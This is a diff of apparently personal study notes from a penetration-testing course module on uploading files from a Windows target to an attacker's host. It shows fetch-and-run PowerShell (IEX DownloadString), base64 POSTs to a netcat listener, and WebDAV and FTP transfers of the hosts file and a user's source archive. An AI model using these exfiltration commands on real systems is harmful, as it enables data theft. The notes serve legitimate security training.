@@ -288,7 +288,7 @@ Most companies allow `HTTP` and `HTTPS` outbound traffic through the `firewall` 
 
 #### Installing a Configured WebServer with Upload
 
-```shell-session
+```bash
 OathBornX@htb[/htb]$ pip3 install uploadserver
 
 Collecting upload server
@@ -297,7 +297,7 @@ Installing collected packages: uploadserver
 Successfully installed uploadserver-2.0.1
 ```
 
-```shell-session
+```bash
 OathBornX@htb[/htb]$ python3 -m uploadserver
 
 File upload available at /upload
@@ -308,7 +308,7 @@ Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/
 
 #### PowerShell Script to Upload a File to Python Upload Server
 
-```powershell-session
+```bash
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 
@@ -320,10 +320,135 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 
 `PowerShell` and `base64` can also be used for `upload operations`: use `Invoke-WebRequest` or `Invoke-RestMethod` together with `Netcat`. Start `Netcat` to `listen` on a specified `port`, then send the `file` as a `POST` request. Finally, copy the `output` and run a `base64 decode` on the `base64` string to recreate the `file`.
 
-```powershell-session
+```bash
 PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
 
+We catch the `base64 data` with `Netcat` and use the `base64 application` with the decode option to convert the string to the file.
 
+```bash
+OathBornX@htb[/htb]$ nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.49.128:8000
+Content-Length: 1820
+Connection: Keep-Alive
+
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
+...SNIP...
+```
+
+```bash
+OathBornX@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
+```
+
+---
+# SMB Uploads
+
+When organizations restrict outbound `SMB` traffic (`TCP/445`), only `HTTP` (`TCP/80`) and `HTTPS` (`TCP/443`) are typically permitted to exit the internal network. Blocking `SMB` prevents potential lateral movement and external exfiltration risks, as discussed in Microsoft’s guidance _Preventing SMB traffic from lateral connections and entering or leaving the network_.
+
+An alternative method is tunneling `SMB` over `HTTP` using `WebDAV`. The `WebDAV` protocol (RFC 4918) extends `HTTP` to allow a webserver to function as a `fileserver` that supports collaborative content management. `WebDAV` can also operate over `HTTPS` for encrypted communication.
+
+When connecting to a network share via `SMB`, the client first attempts the standard `SMB` protocol. If no `SMB` share is found, it will automatically fall back to `HTTP`. A `Wireshark` capture example shows a connection attempt to a share named _testing3_—after failing to locate the `SMB` share, it transitions to `HTTP` for communication.
+
+![[{E458F622-C9CD-452A-9FF2-B95C49DE9C00}.png]]
+
+#### Using the WebDav Python module
+
+```bash
+OathBornX@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+
+[sudo] password for plaintext: 
+Running without configuration file.
+10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
+10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
+10:02:53.950 - INFO    : Property manager:  None
+10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
+10:02:53.950 - INFO    : Registered DAV providers by route:
+10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
+10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
+10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
+10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
+```
+
+#### Connecting to the Webdav Share
+
+Now we can attempt to connect to the share using the `DavWWWRoot` directory.
+
+```bash
+C:\htb> dir \\192.168.49.128\DavWWWRoot
+
+ Volume in drive \\192.168.49.128\DavWWWRoot has no label.
+ Volume Serial Number is 0000-0000
+
+ Directory of \\192.168.49.128\DavWWWRoot
+
+05/18/2022  10:05 AM    <DIR>          .
+05/18/2022  10:05 AM    <DIR>          ..
+05/18/2022  10:05 AM    <DIR>          sharefolder
+05/18/2022  10:05 AM                13 filetest.txt
+               1 File(s)             13 bytes
+               3 Dir(s)  43,443,318,784 bytes free
+```
+
+**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your `WebDAV server`. The `DavWWWRoot` keyword tells the Mini-Redirector driver, which handles `WebDAV requests` that you are connecting to the root of the WebDAV server.
+
+You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: `\192.168.49.128\sharefolder`
+
+#### Uploading Files using SMB
+
+```bash
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+
+---
+# FTP Uploads
+
+`Uploading` `files` using `FTP` is very similar to `downloading` `files`. We can use `PowerShell` or the `FTP client` to complete the `operation`. Before we start our `FTP Server` using the `Python` module `pyftpdlib`, we need to specify the option `--write` to allow `clients` to `upload` `files` to our `attack host`.
+
+```bash
+OathBornX@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
+
+/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
+  warnings.warn("write permissions assigned to anonymous user.",
+[I 2022-05-18 10:33:31] concurrency model: async
+[I 2022-05-18 10:33:31] masquerade (NAT) address: None
+[I 2022-05-18 10:33:31] passive ports: None
+[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
+```
+
+#### PowerShell Upload File
+
+```bash
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+#### Create a Command File for the FTP Client to Upload a File
+
+```bash
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+```
 
